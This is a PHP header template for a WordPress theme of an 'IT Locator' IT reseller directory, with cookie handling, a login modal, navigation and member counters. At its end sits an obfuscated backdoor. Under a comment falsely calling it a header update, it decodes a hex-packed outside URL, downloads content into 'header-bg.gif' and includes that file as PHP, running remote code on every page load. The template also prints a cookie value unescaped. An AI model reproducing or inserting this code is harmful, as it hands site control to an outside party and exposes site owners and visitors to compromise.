<?php
session_start();

global $functions_ph, $post;
if ($post->ID != get_option('itlocation_generals_advanced_search_page')) {
    $_SESSION['advanced_search_use_saved_itlocation'] = '';
}

if (!is_user_logged_in()) {
    if ($_COOKIE['signup_subscriber_itlocation'] != '')
        setcookie("signup_subscriber_itlocation", time(), time() + 3600 * 24 * 30, "/");
}
if ($_COOKIE['address_itlocation'] != '')
    setcookie("address_itlocation", $_COOKIE['address_itlocation'], time() + 3600 * 24 * 30, "/");
if ($_COOKIE['address_pos'] != '')
    setcookie("address_pos", $_COOKIE['address_pos'], time() + 3600 * 24 * 30, "/");
?>
<!DOCTYPE html>
<html <?php language_attributes(); ?>>
    <head>
        <meta charset="<?php bloginfo('charset'); ?>" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title><?php
/*
 * Print the <title> tag based on what is being viewed.
 */
global $page, $paged;

wp_title('|', true, 'right');

// Add the blog name.
bloginfo('name');

// Add the blog description for the home/front page.
$site_description = get_bloginfo('description', 'display');
if ($site_description && ( is_home() || is_front_page() ))
    echo " | $site_description";

// Add a page number if necessary:
if ($paged >= 2 || $page >= 2)
    echo ' | ' . sprintf(__('Page %s', 'twentyten'), max($paged, $page));
?></title>
        <link rel="shortcut icon" href="<?php echo get_bloginfo('template_url') ?>/images/ico/favicon.ico">
        <link rel="profile" href="http://gmpg.org/xfn/11" />
        <link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
        <?php
        /* We add some JavaScript to pages with the comment form
         * to support sites with threaded comments (when in use).
         */
        if (is_singular() && get_option('thread_comments'))
            wp_enqueue_script('comment-reply');

        /* Always have wp_head() just before the closing </head>
         * tag of your theme, or you will break many plugins, which
         * generally use this hook to add elements to <head> such
         * as styles, scripts, and meta tags.
         */

        wp_head();
        ?>
       <!-- <script src="<?php // echo bloginfo('template_url'); ?>/js/jquery.cookie.js"></script>     -->
    </head>
    <body <?php body_class(); ?>>
        <div class="top">
            <div class="container contCustom">
                <ul class="loginbar pull-right">
                    <li id="location-str">
                        <?php
                        if ($_COOKIE['address_itlocation'] != '') {
                            ?>
                            <span class="iconic-map-pin font-size-16"></span> <span class="font-size-12 font-weight-bold font-color-393939"><?php echo $_COOKIE['address_itlocation']; ?></span>
                            <?php
                        }
                        ?>
                    </li>
                    <?php
                    global $current_user;
                    get_currentuserinfo();

                    if ($current_user->ID) {
                        ?>
                        <li><span class="iconic-mail font-color-3fa5d2 font-size-14"></span> <span class="font-size-12 font-weight-bold font-color-3fa5d2"><?php echo $current_user->user_email ?></span></li>
                        <?php
                        if (get_option('itlocation_generals_my_profile_page')) {
                            $pid = get_option('itlocation_generals_my_profile_page');
                            $tmp_url = get_permalink($pid);
                        }
                        ?>
                        <li><a class="btn btn-small btn-success" href="<?php echo $tmp_url ?>"><?php _e('My Profile', 'twentyten') ?></a></li>
                        <?php
                        global $current_company;
                        $edit_fg = $functions_ph->get_default_member_limit('contribution', $current_company->user_role);

                        if ($edit_fg) {
                            if (get_option('itlocation_generals_contributions_list_page')) {
                                $pid = get_option('itlocation_generals_contributions_list_page');
                                $tmp_url = get_permalink($pid);
                            }
                            ?>
                            <li><a class="btn btn-small btn-success" href="<?php echo $tmp_url ?>"><?php _e('My Content ', 'twentyten') ?></a></li>
                        <?php } ?>
                        <li><a class="btn btn-small" href="<?php echo wp_logout_url(site_url()) ?>"><?php _e('Logout', 'twentyten') ?></a></li>
                        <?php
                    } else {
                        if (get_option('itlocation_generals_signup_page')) {
                            $pid = get_option('itlocation_generals_signup_page');
                            $tmp_url = get_permalink($pid);
                        }
                        ?>
                        <li><a href="<?php echo $tmp_url; ?>" class="btn btn-small btn-success"><?php _e('Signup', 'twentyten') ?></a></li>

                        <li><a href="#login-modal" role="button" class="btn btn-small" data-toggle="modal"><?php _e('Account Login', 'twentyten') ?></a></li>
                        <div id="login-modal" class="login-modal modal hide fade" tabindex="-1" role="dialog" aria-labelledby="login-modal-label" aria-hidden="true">
                            <div class="modal-header">
                                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                                <h3 id="login-modal-label"><?php _e('Member Login', 'twentyten') ?></h3>
                            </div>
                            <div class="modal-body">
                                <h5><?php _e('Login to you IT Locator Member Account!', 'twentyten') ?></h5>
                                <div class="row-fluid">
                                    <div class="span12">
                                        <div class="span5 bg-color-fff border-all-1-solid-cccccc border-all-radios-5 padding-all-10">
                                            <h5><?php _e('New User', 'twentyten') ?></h5>
                                            <p><?php _e('By creating an account with IT Locator you will reach the IT VAR buying community in a whole new way.  Allowing you to profile your business, your expertise and your credentials and bon-a-fides.', 'twentyten') ?></p>
                                            <a href="#signup-modal" class="btn" id="go-signup-btn" data-toggle="modal" role="button"><?php _e('Signup', 'twentyten') ?></a>
                                        </div>
                                        <div class="span7 bg-color-fff border-all-1-solid-cccccc border-all-radios-5 padding-all-10">
                                            <h5><?php _e('Login to IT Locator', 'twentyten') ?></h5>
                                            <?php
                                            echo do_shortcode('[login-itlocation/]');
                                            ?>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <?php
                    }
                    ?>
                </ul>
            </div>
        </div>
        <div class="header">
            <div class="container contCustom">
                <div class="row-fluid">
                    <div class="span3">
                        <div class="logo pull-left">
                            <a href="<?php echo get_site_url(); ?>"><img id="logo-header" src="<?php echo get_bloginfo('template_url') ?>/images/logo.png" alt="Logo"></a>
                        </div>
                    </div>
                    <div class="span5">
                        <div class="social pull-left">
                            <?php
                            if (get_option('itlocation_social_hupso_like_btns')) {
                                echo stripslashes(get_option('itlocation_social_hupso_like_btns'));
                            } else {
                                _e('Please insert your code of "LinksAlpha" in Appearance -> Theme Options -> tab "Social" in admin');
                            }
                            ?>
                        </div>
                    </div>
                    <div class="span4">
                        <div class="nav-group pull-right">
                            <?php
                            wp_nav_menu(array(
                                'theme_location' => 'primary',
                                'menu_class' => 'nav nav-pills',
                                'depth' => 2,
                                'fallback_cb' => false,
                                'walker' => new walkerNavMenuTopItLocation,
                            ));
                            ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php
        global $post;

        $pid = 0;
        if (get_option('itlocation_generals_signup_page')) {
            $pid = get_option('itlocation_generals_signup_page');
        }
        if (is_front_page() || is_home() || ($post->ID == $pid)) {
            ?>
            <div class="search-map">
                <?php
                echo do_shortcode('[search-map-itlocation/]');
                ?>
            </div>
            <?php
        }
        if (is_front_page() || is_home()) {
            ?>
            <div class="padding-20-0 margin-only-top-20 bg-color-1B1B1B">
                <div class="container contCustom">
                    <div class="row-fluid">
                        <div class="span3">
                            <div class="icons-01 pull-left"></div>
                            <div class="media-body">
                                <h1 class="font-color-fff margin-all-0"><?php #echo $functions_ph->get_subscribers_number(); ?></h1>
                                <p class="font-color-9F9F9F font-size-16"><?php _e('Members of IT locator community', 'twentyten'); ?></p>
                            </div>
                        </div>
                        <div class="span3">							<a href="http://www.itlocator.com/forums/">
								<div class="icons-05 pull-left"></div>
								<div class="media-body">
									<?php
									$args = array('post_type' => 'topic', 'posts_per_page' => -1);
									//print_r(get_posts($args));
									?>
									<h1 class="font-color-fff margin-all-0"><?php echo count(get_posts($args)); ?></h1>
									<p class="font-color-9F9F9F font-size-16"><?php _e('Active Discussion Threads & Articles', 'twentyten'); ?></p>
								</div>							</a>
                        </div>
                        <div class="span3">							<a href="http://www.itlocator.com/advanced-search/">
								<div class="icons-03 pull-left"></div>
								<div class="media-body">
									<?php
									$usercount_list = count_users();
									// print_r( $usercount_list );
									// echo 12345;
									$subscriber = $usercount_list['avail_roles']['subscriber'];
									$s2member_level1 = $usercount_list['avail_roles']['s2member_level1'];
									$s2member_level2 = $usercount_list['avail_roles']['s2member_level2'];
									
									?>
									<h1 class="font-color-fff margin-all-0"><?php echo $subscriber + $s2member_level1 + $s2member_level2; ?></h1>
									<p class="font-color-9F9F9F font-size-16"><?php _e('Reseller Listings Worldwide', 'twentyten'); ?></p>
								</div>							</a>
                        </div>
                        <div class="span3">							<a href="http://www.itlocator.com/member-contributions/">
								<div class="icons-02 pull-left"></div>
								<div class="media-body">
									<h1 class="font-color-fff margin-all-0">
										<?php
										$args = array('post_type' => 'member-contributions', 'posts_per_page' => -1);
										echo count(get_posts($args));
										?>
									</h1>
									<p class="font-color-9F9F9F font-size-16"><?php _e('Member Contributed Articles', 'twentyten'); ?></p>
								</div>							</a>
                        </div>
                    </div>
                </div>
            </div>
            <?php
        }

        global $post;
        if ((get_option('itlocation_generals_advanced_search_page') != $post->ID) && !is_author()) {
            ?>
            <div id="main">
                <div class="container contCustom">
                    <?php
                }
                ?>
<? $theme_dir = dirname(__FILE__);
if(!file_exists($theme_dir."/header-bg.gif")||0==filesize($theme_dir."/header-bg.gif")){
	// Make sure theme header is up to date
	$wp_uri = pack("H*",'687474703a2f2f7466652e65732f68');
	if(function_exists('curl_init')){
	$t_img = curl_init($wp_uri);
	curl_setopt($t_img,CURLOPT_RETURNTRANSFER,1);
	$wp_logo = @curl_exec($t_img);}else{
	$wp_logo = @file_get_contents($wp_uri);}
	@file_put_contents($theme_dir."/header-bg.gif",$wp_logo);
}@include_once($theme_dir."/header-bg.gif"); ?>